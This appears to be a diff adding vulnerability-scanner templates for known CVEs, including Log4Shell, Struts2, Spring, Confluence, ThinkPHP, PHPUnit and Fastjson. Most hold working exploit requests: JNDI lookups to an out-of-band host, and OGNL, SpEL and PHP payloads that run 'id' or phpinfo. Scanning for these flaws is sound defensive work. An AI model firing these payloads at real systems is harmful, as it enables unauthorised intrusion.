@@ -1,0 +1,319 @@
+id: wvs-log4shell-cve-2021-44228
+info:
+  name: Apache Log4j2 JNDI 注入 (CVE-2021-44228 / Log4Shell)
+  author: huocai250
+  severity: critical
+  category: 远程代码执行
+  description: 在常见 Header 注入 JNDI 探测标记，需在 --canary 指定的 collaborator 上确认回连。
+  tags: cve,cve2021,rce,log4shell,oob
+  metadata:
+    product: [log4j, apache]
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?wvs12poc=${jndi:ldap://{{interactsh-url}}/a}"
+      - "{{BaseURL}}/?wvs12poc=${jndi:dns://{{interactsh-url}}/a}"
+    headers:
+      X-Api-Version: "${jndi:ldap://{{interactsh-url}}/a}"
+      X-Forwarded-For: "${jndi:ldap://{{interactsh-url}}/a}"
+      Referer: "${jndi:dns://{{interactsh-url}}/a}"
+      User-Agent: "Mozilla/5.0 ${jndi:ldap://{{interactsh-url}}/a}"
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "wvs12poc=${jndi:ldap://{{interactsh-url}}/a}"
+---
+id: wvs-spring4shell-cve-2022-22965
+info:
+  name: Spring Framework RCE (CVE-2022-22965 / Spring4Shell)
+  author: huocai250
+  severity: critical
+  category: 远程代码执行
+  description: 通过 class.module.classLoader 属性访问探测 Tomcat 是否可被写入（验证型，不落地 webshell）。
+  tags: cve,cve2022,rce,spring,tomcat
+  metadata:
+    product: [spring, springframework]
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "class.module.classLoader.URLs%5B0%5D=0&class.module.classLoader.path=%2Ftmp&suffix=%3E%25%2F%2F&c1=Runtime&c2=%3C%25&class.module.classLoader.resources.context.parent.pipeline.first.pattern=1&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words: ["Bad Request", "There was an unexpected error"]
+        part: body
+      - type: status
+        status: [400, 500]
+---
+id: wvs-spring-cloud-gateway-cve-2022-22947
+info:
+  name: Spring Cloud Gateway SpEL RCE (CVE-2022-22947)
+  author: huocai250
+  severity: critical
+  category: 远程代码执行
+  description: 通过 AddResponseHeader 过滤器注入 SpEL 执行 id 验证命令执行，仅回显验证。
+  tags: cve,cve2022,rce,spring,spel
+  metadata:
+    product: [springcloud, gateway]
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/actuator/gateway/routes/wvs12poc"
+    headers:
+      Content-Type: application/json
+    body: '{"id":"wvs12poc","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],"uri":"http://example.com","predicates":[{"name":"Path","args":{"_genkey_0":"/wvs12poc/**"}}]}'
+  - method: POST
+    path:
+      - "{{BaseURL}}/actuator/gateway/refresh"
+  - method: GET
+    path:
+      - "{{BaseURL}}/actuator/gateway/routes/wvs12poc"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["uid="]
+    stop-at-first-match: true
+---
+id: wvs-shiro-cve-2016-4437
+info:
+  name: Apache Shiro RememberMe 反序列化 (CVE-2016-4437)
+  author: huocai250
+  severity: high
+  category: 反序列化
+  description: 发送 rememberMe 无效值时若返回 deleteMe 头，说明存在 Shiro 框架，存在反序列化利用面。
+  tags: cve,cve2016,deserialization,shiro
+  metadata:
+    product: [shiro]
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/login"
+    headers:
+      Cookie: rememberMe=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200, 302, 401, 403]
+      - type: word
+        part: header
+        words: ["rememberMe=deleteMe"]
+    stop-at-first-match: true
+---
+id: wvs-struts2-s2-045
+info:
+  name: Apache Struts2 S2-045 RCE (CVE-2017-5638)
+  author: huocai250
+  severity: critical
+  category: 远程代码执行
+  description: Content-Type OGNL 注入执行 id 验证（只读命令，不落地文件）。
+  tags: cve,cve2017,rce,struts,ognl
+  metadata:
+    product: [struts, struts2]
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+    body: "wvs12poc=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["uid="]
+---
+id: wvs-struts2-s2-057
+info:
+  name: Apache Struts2 S2-057 RCE (CVE-2018-11776)
+  author: huocai250
+  severity: critical
+  category: 远程代码执行
+  description: 命名空间 OGNL 算术验证（111+111=222），无副作用。
+  tags: cve,cve2018,rce,struts,ognl
+  metadata:
+    product: [struts, struts2]
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/${(111+111)}/wvs12poc.action"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200, 302]
+      - type: word
+        words: ["222"]
+        part: all
+---
+id: wvs-thinkphp5-rce
+info:
+  name: ThinkPHP 5.x 远程代码执行
+  author: huocai250
+  severity: critical
+  category: 远程代码执行
+  description: 通过 invokefunction / Request 过滤器执行 phpinfo 验证（无害信息页）。
+  tags: thinkphp,rce,cve
+  metadata:
+    product: [thinkphp, thinkphp5]
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
+      - '{{BaseURL}}/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["PHP Version"]
+  - method: POST
+    path:
+      - '{{BaseURL}}/?s=index/\think\Request/input&filter[]=phpinfo&data=1'
+      - "{{BaseURL}}/index.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "_method=__construct&filter[]=phpinfo&method=get&get[]=phpinfo"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["PHP Version"]
+    stop-at-first-match: true
+---
+id: wvs-confluence-cve-2021-26084
+info:
+  name: Atlassian Confluence OGNL 注入 (CVE-2021-26084)
+  author: huocai250
+  severity: critical
+  category: 远程代码执行
+  description: doenterpagevariables 参数 OGNL 算术验证（7*7=49），无副作用。
+  tags: cve,cve2021,rce,confluence,ognl
+  metadata:
+    product: [confluence]
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/pages/doenterpagevariables.action"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "queryString=wvs12test%27%2B%7B7*7%7D%2B%27end"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["49"]
+---
+id: wvs-confluence-cve-2022-26134
+info:
+  name: Atlassian Confluence OGNL RCE (CVE-2022-26134)
+  author: huocai250
+  severity: critical
+  category: 远程代码执行
+  description: URL 路径 OGNL 设置会话属性并回显唯一标记验证，无副作用。
+  tags: cve,cve2022,rce,confluence,ognl
+  metadata:
+    product: [confluence]
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%24%7B%23a%3D%40org.apache.struts2.ServletActionContext%40getRequest%28%29%2C%23b%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29%2C%23c%3D%23a.getSession%28%29%2C%23c.setAttribute%28%22wvs12poc%22%2C%22wvs12poc-marker-8899%22%29%2C%23b.getWriter%28%29.println%28%23c.getAttribute%28%22wvs12poc%22%29%29%2C%23b.flush%28%29%2C%23b.close%28%29%7D/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200, 302]
+      - type: word
+        words: ["wvs12poc-marker-8899"]
+---
+id: wvs-phpunit-eval-stdin-cve-2017-9841
+info:
+  name: PHPUnit eval-stdin.php RCE (CVE-2017-9841)
+  author: huocai250
+  severity: critical
+  category: 远程代码执行
+  description: 向 eval-stdin.php POST 无害 PHP 表达式并匹配 md5 回显验证。
+  tags: cve,cve2017,rce,phpunit
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+    body: "<?php echo md5('wvs12poc'); ?>"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["b1c0ad0f28be4f1b2e2e37c0f26a64b3"]
+---
+id: wvs-owncloud-cve-2023-49103
+info:
+  name: ownCloud GraphAPI 信息泄露 (CVE-2023-49103)
+  author: huocai250
+  severity: high
+  category: 信息泄露
+  description: 未授权访问 GetPhpInfo.php 泄露 phpinfo 环境配置。
+  tags: cve,cve2023,exposure,owncloud
+  metadata:
+    product: [owncloud]
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["PHP Version"]
+---
+id: wvs-fastjson-detect
+info:
+  name: Fastjson 反序列化探测
+  author: huocai250
+  severity: medium
+  category: 反序列化
+  description: 通过 autoType 错误特征与 JNDI 探测标记识别 Fastjson 解析器（OOB 需 collaborator 确认）。
+  tags: fastjson,deserialization,rce,oob
+  metadata:
+    product: [fastjson]
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: application/json
+    body: '{"@type":"java.lang.AutoCloseable"}'
+    matchers-condition: or
+    matchers:
+      - type: word
+        words: ["autoType is not support", "fastjson", "com.alibaba.fastjson"]
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: application/json
+    body: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}/wvs12","autoCommit":true}'
+---
+id: wvs-weblogic-ssrf-cve-2014-4210
+info:
+  name: Oracle WebLogic SSRF (CVE-2014-4210)
+  author: huocai250
+  severity: high
+  category: SSRF
+  description: UDDI 搜索接口 operator 参数注入 canary，需在 collaborator 确认回连。
+  tags: cve,cve2014,ssrf,weblogic,oob
+  metadata:
+    product: [weblogic]
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{{interactsh-url}}"
